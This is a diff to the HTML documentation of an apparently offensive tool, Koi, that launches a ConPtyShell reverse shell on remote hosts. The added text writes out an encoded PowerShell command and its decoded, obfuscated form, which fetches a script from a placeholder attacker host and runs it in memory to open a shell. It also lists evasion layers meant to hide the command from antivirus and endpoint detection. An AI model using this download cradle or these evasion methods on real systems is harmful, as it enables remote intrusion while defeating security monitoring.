@@ -901,10 +901,13 @@
 </ol>
 <h3 id="how-it-works-internally">How it works internally</h3>
 <p>Koi launches the following kind of command on the remote host:</p>
-<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&quot;</span>
-<span class="s2">IEX(IWR &#39;http://&lt;LOCAL_IP&gt;:&lt;HTTP_PORT&gt;/c.ps1&#39; -UseBasicParsing);</span>
-<span class="s2">&lt;OBFUSCATED_FUNCTION&gt; -RemoteIp &lt;LOCAL_IP&gt; -RemotePort &lt;PORT&gt; -Rows &lt;ROWS&gt; -Cols &lt;COLS&gt; -CommandLine powershell&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-enc</span> <span class="p">&lt;</span><span class="n">BASE64</span><span class="p">&gt;</span>
 </code></pre></div>
+<p>The base64 payload decodes to something like:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&amp;(</span><span class="s1">&#39;Invoke-&#39;</span><span class="p">+</span><span class="s1">&#39;Expression&#39;</span><span class="p">)(&amp;((</span><span class="s1">&#39;{0}{1}&#39;</span><span class="o">-f</span><span class="s1">&#39;Invoke-Web&#39;</span><span class="p">,</span><span class="s1">&#39;Request&#39;</span><span class="p">)</span> <span class="s1">&#39;http://&lt;IP&gt;:&lt;PORT&gt;/c.ps1&#39;</span> <span class="n">-UseBasicParsing</span><span class="p">));</span>
+<span class="p">&lt;</span><span class="n">OBFUSCATED_FUNCTION</span><span class="p">&gt;</span> <span class="n">-RemoteIp</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-RemotePort</span> <span class="p">&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="n">-Rows</span> <span class="p">&lt;</span><span class="n">ROWS</span><span class="p">&gt;</span> <span class="n">-Cols</span> <span class="p">&lt;</span><span class="n">COLS</span><span class="p">&gt;</span> <span class="n">-CommandLine</span> <span class="n">powershell</span>
+</code></pre></div>
+<p>The outer command uses <code>-EncodedCommand</code> so no plaintext <code>IEX</code> or <code>IWR</code> appears on the command line. The inner payload uses randomised call obfuscation so cmdlet names are never literal strings.</p>
 <h3 id="more-details">More details</h3>
 <h4 id="automatic-caching">Automatic caching</h4>
 <p>If GitHub is unreachable, Koi automatically falls back to the locally cached version of ConPtyShell.</p>
@@ -931,13 +934,14 @@
 <li><code>Invoke-WebRequest</code></li>
 <li>ConPTY-related behaviours</li>
 </ul>
-<p>Koi currently mitigates this partially through:</p>
+<p>Koi mitigates this through several layers:</p>
 <ul>
-<li>Function name obfuscation</li>
-<li>In-memory execution</li>
-<li>Temporary HTTP staging</li>
+<li><strong><code>-EncodedCommand</code> base64 wrapping</strong> — <code>IEX</code>, <code>IWR</code>, the URL, and the function name are invisible on the command line.</li>
+<li><strong>Randomised cmdlet obfuscation</strong> — <code>Invoke-Expression</code> and <code>Invoke-WebRequest</code> are rewritten at runtime using one of three techniques (string concatenation, <code>-f</code> format string, or char-array join), chosen randomly each time.</li>
+<li><strong>Function and symbol renaming</strong> — the ConPtyShell PS1 script has all class names, method names, and the entry-point function renamed to random identifiers.</li>
+<li><strong>C# string literal replacement</strong> — known signal strings in the embedded C# source are replaced with char-array construction expressions.</li>
+<li><strong>In-memory execution</strong> — the script is never written to disk; it is fetched and executed directly via <code>IEX</code>.</li>
 </ul>
-<p>Further stealth improvements are planned in future updates.</p>
 
 
 
